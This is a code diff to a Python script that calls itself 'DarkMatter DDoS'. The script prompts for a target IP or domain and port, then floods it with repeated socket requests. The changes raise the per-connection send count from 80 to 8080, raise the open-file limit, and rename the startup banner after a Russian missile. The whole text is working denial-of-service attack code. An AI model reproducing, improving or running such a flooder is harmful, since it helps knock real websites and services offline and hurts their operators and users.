@@ -11,7 +11,7 @@ print("System detected: ", sysOS)
 
 if sysOS == "Linux":
   try:
-    os.system("ulimit -n 1030000")
+    os.system("ulimit -n 2330000")
   except Exception as e:
     print(e)
     print("Could not start the script")
@@ -35,7 +35,7 @@ def attack():
       atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       atk.connect((ip, port))
       #Attack starts here
-      for y in range(80):
+      for y in range(8080):
           atk.send(str.encode(request))
     except socket.error:
       sleep(0)
@@ -45,8 +45,8 @@ def attack():
 print("Welcome To DarkMatter DDoS\n")
 ip = input("IP/Domain: ")
 port = int(input("Port: "))
-url = f"http://{str(ip)}" 
-print("[>>>] Starting the attack [<<<]")
+url = f"https://{str(ip)}" 
+print("[>>>] RS-28 Sarmat [<<<]")
 sleep(1)
 
 def send2attack():
